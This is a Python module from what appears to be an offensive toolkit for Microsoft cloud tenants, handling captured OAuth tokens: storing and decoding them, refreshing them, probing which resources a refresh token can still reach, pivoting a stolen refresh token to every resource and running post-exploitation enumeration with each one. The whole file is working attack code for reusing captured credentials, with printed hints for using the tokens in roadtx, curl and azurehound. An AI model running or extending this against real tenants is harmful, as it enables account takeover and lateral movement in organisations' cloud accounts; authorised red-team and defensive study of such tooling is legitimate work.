"""Module 6: Token operations -- normalize, store, decode, refresh, import.

Shared token format (MadApe/roadtx interop):
  {access_token, refresh_token, token_type, expires_in, scope, tenant_id, upn,
   source, captured_at}
"""
import glob as _glob
import json
import os
import time

import requests

from lib import clients
from lib.logger import logged_session
from lib.oauth import refresh_v1, refresh_v2
from lib.util import decode_jwt, now_iso

INTERESTING_CLAIMS = ["aud", "amr", "scp", "roles", "deviceid", "upn", "unique_name", "tid", "appid", "exp"]


def normalize(raw, cfg=None, source="manual", meta=None):
    """Coerce any token response into the shared format."""
    tok = {
        "access_token": raw.get("access_token"),
        "refresh_token": raw.get("refresh_token"),
        "token_type": raw.get("token_type", "Bearer"),
        "expires_in": raw.get("expires_in"),
        "scope": raw.get("scope"),
        "tenant_id": (cfg.tenant_id if cfg else None) or raw.get("tenant_id"),
        "upn": raw.get("upn"),
        "source": source,
        "captured_at": raw.get("captured_at") or now_iso(),
    }
    if tok["access_token"]:
        try:
            claims = decode_jwt(tok["access_token"])
            tok["upn"] = tok["upn"] or claims.get("upn") or claims.get("unique_name")
            tok["tenant_id"] = tok["tenant_id"] or claims.get("tid")
            tok["_claims"] = {k: claims.get(k) for k in INTERESTING_CLAIMS if k in claims}
        except Exception:
            pass
    if meta:
        tok["_meta"] = meta
    return tok


def store_token(eng, name, raw, cfg=None, source="gatecrash", meta=None):
    """Normalize + save a token to the engagement tokens dir. Returns the path."""
    return eng.save_token(name, normalize(raw, cfg, source, meta))


def is_expired(tok, skew=120):
    claims = tok.get("_claims") or {}
    exp = claims.get("exp")
    if not exp and tok.get("access_token"):
        try:
            exp = decode_jwt(tok["access_token"]).get("exp")
        except Exception:
            return False
    return bool(exp) and time.time() > (exp - skew)


def decode_token(tok):
    """Return the full decoded claims of a stored token's access_token."""
    if not tok.get("access_token"):
        return {}
    return decode_jwt(tok["access_token"])


def refresh(cfg, tok, resource=None, scope=None, client="office"):
    """Refresh a stored token to the same or a new resource. Returns the raw response dict."""
    rt = tok.get("refresh_token")
    if not rt:
        return {"error": "no_refresh_token"}
    cid = clients.client_id(client)
    session = logged_session("refresh")
    if scope:
        _, out = refresh_v2(session, cfg.tenant_id, cid, rt, clients.v2_scope(scope, cfg.sharepoint_host))
    else:
        resource = resource or clients.v1_resource("graph")
        _, out = refresh_v1(session, cfg.tenant_id, cid, rt, clients.v1_resource(resource, cfg.sharepoint_host))
    return out


def test_resources(cfg, tok, client="office"):
    """Which resources this refresh token can still reach (CA re-evaluates per target)."""
    rt = tok.get("refresh_token")
    if not rt:
        return {}
    results = {}
    session = logged_session("test-resources")
    cid = clients.client_id(client)
    for name in clients.PIVOT_SCOPES:
        _, out = refresh_v2(session, cfg.tenant_id, cid, rt, clients.v2_scope(name, cfg.sharepoint_host))
        results[name] = "OK" if "access_token" in out else out.get("error", "fail")
    return results


def pivot_all(cfg, eng, source_name, ua=None):
    """Try pivoting any stored refresh token to all resources. Returns list of new token names."""
    from lib.logger import get as get_log
    log = get_log()
    tok = eng.load_token(source_name)
    if not tok or not tok.get("refresh_token"):
        log.info(f"[pivot] No refresh token in '{source_name}'; skipping pivot.")
        return []
    rt = tok["refresh_token"]
    cid = clients.client_id("office")
    session = logged_session("pivot")
    gained = []
    log.info(f"[pivot] Pivoting '{source_name}' refresh token to {len(clients.PIVOT_SCOPES)} resources...")
    for name in clients.PIVOT_SCOPES:
        if eng.load_token(name):
            log.info(f"[pivot]   {name}: already have token, skipping")
            continue
        scope = clients.v2_scope(name, cfg.sharepoint_host)
        _, out = refresh_v2(session, cfg.tenant_id, cid, rt, scope, ua=ua)
        if "access_token" in out:
            store_token(eng, name, out, cfg, source="gatecrash",
                        meta={"pivot_from": source_name})
            claims = decode_jwt(out["access_token"])
            log.info(f"[pivot]   {name}: TOKEN (aud={claims.get('aud')})")
            gained.append(name)
        else:
            log.info(f"[pivot]   {name}: {out.get('error', 'fail')}")
    if gained:
        log.info(f"[pivot] Gained {len(gained)} new tokens: {', '.join(gained)}")
    else:
        log.info("[pivot] No new tokens from pivot.")
    return gained


def enumerate_all(cfg, eng):
    """Enumerate with every stored token that has a known audience. Returns combined results."""
    from lib.logger import get as get_log
    from modules import post_ex
    log = get_log()
    token_files = _glob.glob(os.path.join(eng.tokens, "*.json"))
    if not token_files:
        log.info("[enumerate-all] No tokens stored.")
        return {}
    all_results = {}
    for path in sorted(token_files):
        name = os.path.splitext(os.path.basename(path))[0]
        tok = eng.load_token(name)
        at = tok.get("access_token") if tok else None
        if not at:
            continue
        try:
            claims = decode_jwt(at)
        except Exception:
            continue
        aud = (claims.get("aud") or "").lower()
        if not any(k in aud for k in ("graph.microsoft", "outlook", "sharepoint", "management.azure",
                                       "management.core", "00000003-0000-0000-c000")):
            continue
        log.info(f"[enumerate-all] Enumerating with '{name}' (aud={aud})")
        import argparse
        fake_args = argparse.Namespace(token=name)
        try:
            result = post_ex.run(cfg, eng, fake_args)
            all_results[name] = result
        except SystemExit as e:
            log.info(f"[enumerate-all]   {name}: {e}")
    return all_results


def list_tokens(eng):
    """List all stored tokens with decoded details. Returns list of dicts."""
    out = []
    for path in sorted(_glob.glob(os.path.join(eng.tokens, "*.json"))):
        name = os.path.splitext(os.path.basename(path))[0]
        try:
            with open(path, encoding="utf-8") as f:
                tok = json.load(f)
        except (OSError, json.JSONDecodeError):
            continue
        claims = {}
        if tok.get("access_token"):
            try:
                claims = decode_jwt(tok["access_token"])
            except Exception:
                pass
        entry = {
            "name": name, "path": path,
            "aud": claims.get("aud", "?"), "upn": tok.get("upn") or claims.get("upn", "?"),
            "amr": claims.get("amr"), "scp": claims.get("scp"),
            "deviceid": claims.get("deviceid"),
            "exp": claims.get("exp"), "source": tok.get("source"),
            "has_refresh": bool(tok.get("refresh_token")),
            "expired": is_expired(tok),
        }
        out.append(entry)
    return out


def run_list(cfg, eng, args):
    """CLI handler: list all stored tokens."""
    tokens = list_tokens(eng)
    if not tokens:
        print("[tokens] No tokens stored.")
        return
    print(f"[tokens] {len(tokens)} token(s) in {eng.tokens}\n")
    print(f"{'Name':<25} {'Audience':<45} {'UPN':<30} {'RT?':>3} {'Exp?':>4}")
    print("-" * 110)
    for t in tokens:
        aud_short = (t["aud"] or "?")
        if len(aud_short) > 42:
            aud_short = aud_short[:42] + "..."
        exp_mark = "YES" if t["expired"] else "no"
        rt_mark = "yes" if t["has_refresh"] else " - "
        print(f"{t['name']:<25} {aud_short:<45} {t.get('upn', '?'):<30} {rt_mark:>3} {exp_mark:>4}")
    print()
    print("[tokens] Use these tokens with:")
    print("  roadtx:    roadtx interactiveauth --tokens-file <path>")
    print("  curl:      curl -H 'Authorization: Bearer <access_token>' https://graph.microsoft.com/v1.0/me")
    print("  azurehound: ... --refresh-token <refresh_token>")
    for t in tokens:
        if t["has_refresh"]:
            print(f"\n  Refresh token ('{t['name']}'): {t['path']}")


def run_import(cfg, eng, args):
    """Import an external token file (MadApe/roadtx/manual) into engagement storage."""
    path = args.token
    if not os.path.exists(path):
        raise SystemExit(f"[import] File not found: {path}")
    with open(path, encoding="utf-8") as f:
        raw = json.load(f)
    source = raw.get("source", "imported")
    tok = normalize(raw, cfg, source=source)
    saved = eng.save_token("imported", tok)
    print(f"[import] Stored as 'imported': upn={tok.get('upn')} source={source}")
    if tok.get("_claims"):
        for k, v in tok["_claims"].items():
            print(f"  {k}: {v}")
    print(f"[import] -> {saved}")
    return saved
